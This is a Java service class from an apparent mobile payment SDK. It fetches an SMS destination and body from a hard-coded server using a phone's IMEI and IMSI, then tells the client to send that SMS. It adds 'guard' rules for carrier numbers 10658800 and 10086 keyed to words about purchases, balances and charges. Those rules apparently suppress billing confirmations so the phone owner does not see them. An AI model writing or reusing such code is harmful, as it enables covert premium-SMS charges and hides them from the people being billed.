package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class BjjsMmDynamicService implements IDynamicService{

	private static final String TYPE = "bjjsMm";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "appid={appid}&imei={imei}&imsi={imsi}&paycode={paycode}&cpid={cpid}&chid={chid}&cpmaram={cpmaram}&extradata={cpmaram}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appid = map.get("appid");
			String paycode = map.get("paycode");
			String cpid = map.get("cpid");
			String chid = map.get("chid");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String cpmaram = map.get("cpmaram");
			String province = map.get("province");
			
			if(province != null && province.length() > 0){
				province = proMap.get(province);
				
				if(province != null && province.length() > 0 && cpmaram != null && cpmaram.length() > province.length()){
					cpmaram = province + cpmaram.substring(province.length());
				}
			}
			
			String param = REQUESTMODEL.replace("{appid}",appid).replace("{paycode}",paycode).replace("{cpid}",cpid).replace("{chid}",chid).replace("{imei}",imei).replace("{imsi}",imsi).replace("{cpmaram}",cpmaram);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parseTxt(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseTxt(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			String[] arr = responseTxt.split("\\*");
			
			if(arr.length == 2){
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(arr[1]);
				sms.setSmsDest(arr[0]);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}
		}
		
		return null;
	}
	
	private static Map<String, String> proMap = new HashMap<String, String>();
	
	/**
	 * 01 安徽    02 北京  03 福建  04 甘肃  05 广东  06 广西  07 贵州  08 海南  09 河北  10 河南  11 黑龙江		
		12 湖北  13 湖南 14 吉林 15 江苏 16 江西 17 辽宁 18 内蒙古 19 宁夏 20 青海 21 山东 22 山西
		23 陕西 24 上海 25 四川 26 天津 27 西藏 28 新疆 29 云南 30 浙江 31 重庆
	 * 
	 */
	
	static{
		proMap.put("8611", "02");
		proMap.put("8612", "26");
		proMap.put("8613", "09");
		proMap.put("8614", "22");
		proMap.put("8615", "18");
		proMap.put("8621", "17");
		proMap.put("8622", "14");
		proMap.put("8623", "11");
		proMap.put("8631", "24");
		proMap.put("8632", "15");
		proMap.put("8633", "30");
		proMap.put("8634", "01");
		proMap.put("8635", "03");
		proMap.put("8636", "16");
		proMap.put("8637", "21");
		proMap.put("8641", "10");
		proMap.put("8642", "12");
		proMap.put("8643", "13");
		proMap.put("8644", "05");
		proMap.put("8645", "06");
		proMap.put("8646", "08");
		proMap.put("8650", "31");
		proMap.put("8651", "25");
		proMap.put("8652", "07");
		proMap.put("8653", "29");
		proMap.put("8654", "27");
		proMap.put("8661", "23");
		proMap.put("8662", "04");
		proMap.put("8663", "20");
		proMap.put("8664", "19");
		proMap.put("8665", "28");
	}
	
	
	
	
	public static void main(String[] args){
		//http://124.172.237.77/MMMessage/getmocontent?appid=108&imei=862594025131367&imsi=460025284891073&paycode=30000826192112&cpid=41&chid=0&cpmaram=12345
		String url = "http://124.172.237.77/MMMessage/getmocontent";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a87654321");
		map.put("appid", "129");
		map.put("imei", "862949029214504");
		map.put("imsi", "460022101441340");
		map.put("paycode", "30000885869112");
		map.put("cpid","41");
		map.put("chid","0");
		map.put("type", "bjjsMm");
		map.put("cpmaram", "0106");
		map.put("province", "8611");
		
		System.out.println(new BjjsMmDynamicService().dynamic(map));
	}

}
